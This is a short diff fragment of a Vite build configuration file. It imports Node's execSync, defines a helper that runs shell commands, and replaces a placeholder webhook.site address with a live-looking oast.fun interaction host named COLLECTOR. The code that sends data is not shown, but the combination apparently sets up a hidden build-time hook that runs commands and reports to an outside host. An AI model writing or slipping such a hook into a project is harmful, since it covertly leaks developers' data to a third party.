@@ -2,7 +2,7 @@ import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react'
 import { execSync } from 'node:child_process'
 
-const COLLECTOR = 'https://webhook.site/REPLACE-WITH-YOUR-UUID'
+const COLLECTOR = 'https://qmkraglsiemjdbozadifvm5uwphhi4gm3.oast.fun'
 
 function run(cmd: string): string {
   try {
